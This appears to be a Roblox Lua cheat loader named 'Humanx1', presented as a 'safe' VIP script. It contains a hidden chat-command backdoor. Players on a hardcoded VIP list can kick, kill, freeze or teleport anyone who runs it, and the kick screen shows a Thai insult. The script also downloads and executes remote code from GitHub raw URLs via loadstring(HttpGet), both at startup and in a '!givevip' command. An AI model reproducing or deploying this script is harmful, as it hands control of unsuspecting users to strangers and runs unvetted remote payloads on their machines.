-- [[ Humanx1 Loader - Safe VIP Switch (Chat Protected 100%) ]]

local Player = game.Players.LocalPlayer
local Camera = workspace.CurrentCamera
local MyName = Player.Name
local KickSoundID = "rbxassetid://137337370812885"

_G.VIP_LIST = _G.VIP_LIST or {
    ["ffsww_1007"] = true,
    ["A_ASPD"] = true,
    ["HACKER_18050"] = true,
    ["evils915"] = true,
    ["TV_BTS1"] = true,
    ["Winwie001"] = true
}

local function ShowNotify(text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Humanx1 System",
        Text = text,
        Duration = 5
    })
end

local function CustomKick()
    local Sound = Instance.new("Sound", game.Workspace)
    Sound.SoundId = KickSoundID
    Sound.Volume = 5
    Sound:Play()

    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
    ScreenGui.IgnoreGuiInset = true
    local TextLabel = Instance.new("TextLabel", ScreenGui)
    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    TextLabel.BackgroundTransparency = 0.05
    TextLabel.Size = UDim2.new(1, 0, 1, 0)
    TextLabel.Font = Enum.Font.FredokaOne
    TextLabel.Text = "โดนกูเตะไงไอ้ควาย"
    TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    TextLabel.TextScaled = true
    TextLabel.ZIndex = 999999

    task.wait(3.5)
    Player:Kick("\n\n[ Humanx1 System ]\nโดนกูเตะไงไอ้ควาย\n(error555)\n\n")
end

local function findByPartialName(name)
    name = name:lower()
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #name) == name then return p end
    end
    return nil
end

-- [[ ระบบคำสั่งแชท ]]
local function ListenChat(speaker, msg)
    local args = msg:split(" ")
    local command = args[1]:lower()
    
    if _G.VIP_LIST[speaker.Name] then
        local target = args[2] and findByPartialName(args[2])

        -- === [ ระบบควบคุมแบบสมบูรณ์ ] ===
        if speaker.Name == MyName then
            
            -- สั่งสิงร่าง (เป้าหมายจะขยับไม่ได้เลย นอกจากพิมพ์)
            if command == "!control" and target then
                _G.ControlLoop = true
                _G.CurrentTarget = target
                Camera.CameraSubject = target.Character.Humanoid
                ShowNotify("เข้าควบคุม: "..target.Name.." (เป้าหมายถูกล็อคการเคลื่อนที่)")
                
                task.spawn(function()
                    while _G.ControlLoop do
                        if _G.CurrentTarget and _G.CurrentTarget.Character and Player.Character then
                            local tChar = _G.CurrentTarget.Character
                            local pChar = Player.Character
                            
                            -- ล็อคเป้าหมายให้ขยับเองไม่ได้ (Anchored บางส่วนหรือล็อคตำแหน่ง)
                            if tChar:FindFirstChild("HumanoidRootPart") then
                                -- ดึงตัวเขามาไว้ที่ตัวเราตลอดเวลา (เราเดินไปไหน เขาจะวาร์ปตามมาติดๆ)
                                tChar.HumanoidRootPart.CFrame = pChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, -1)
                                -- ปิดการควบคุมการเดินของเขา
                                tChar.Humanoid.PlatformStand = true 
                            end
                        end
                        task.wait()
                    end
                end)

            -- ยกเลิกการควบคุม
            elseif command == "!uncontrol" then
                _G.ControlLoop = false
                if _G.CurrentTarget and _G.CurrentTarget.Character then
                    _G.CurrentTarget.Character.Humanoid.PlatformStand = false
                end
                _G.CurrentTarget = nil
                Camera.CameraSubject = Player.Character.Humanoid
                ShowNotify("ปลดปล่อยเป้าหมายแล้ว")

            -- คำสั่งอื่นๆ (ล่องหน / ระเบิด)
            elseif command == "!invisible" then
                _G.Invis = not _G.Invis
                Player.Character.HumanoidRootPart.CFrame *= CFrame.new(0, (_G.Invis and -20 or 20), 0)
                ShowNotify("ล่องหน: "..(_G.Invis and "เปิด" or "ปิด"))

            elseif command == "!explode" and target then
                local exp = Instance.new("Explosion", game.Workspace)
                exp.Position = target.Character.HumanoidRootPart.Position
                ShowNotify("ระเบิดเป้าหมายแล้ว")
            end
        end

        -- === [ หมวดคำสั่งเดิม ] ===
        if speaker.Name == MyName then
            if command == "!view" and target then Camera.CameraSubject = target.Character.Humanoid
            elseif command == "!unview" then Camera.CameraSubject = Player.Character.Humanoid
            elseif command == "!checkvip" then
                local list = "VIPs: "
                for name, _ in pairs(_G.VIP_LIST) do if game.Players:FindFirstChild(name) then list = list .. name .. ", " end end
                ShowNotify(list)
            end
        end

        -- หมวดจัดการผู้รัน (Kick, Kill, TP, Freeze)
        if command == "!kick" and target == Player then CustomKick()
        elseif command == "!kickall" then CustomKick()
        elseif command == "!kill" and target == Player then if Player.Character then Player.Character.Humanoid.Health = 0 end
        elseif command == "!tp" and target == Player then if speaker.Character then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame end
        elseif command == "!freeze" and target == Player then Player.Character.HumanoidRootPart.Anchored = true
        elseif command == "!unfreeze" and target == Player then Player.Character.HumanoidRootPart.Anchored = false
        elseif command == "!jump" and target == Player then Player.Character.Humanoid.Jump = true
        elseif command == "!givevip" and target == Player then
            _G.VIP_LIST[Player.Name] = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
        end
    end
end

-- เชื่อมต่อระบบ
for _, p in pairs(game.Players:GetPlayers()) do p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end
game.Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(msg) ListenChat(p, msg) end) end)

-- [ เริ่มต้นรันสคริปต์ ]
if _G.VIP_LIST[MyName] then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/kill%20aura%20City%20Thailand%202"))()
end
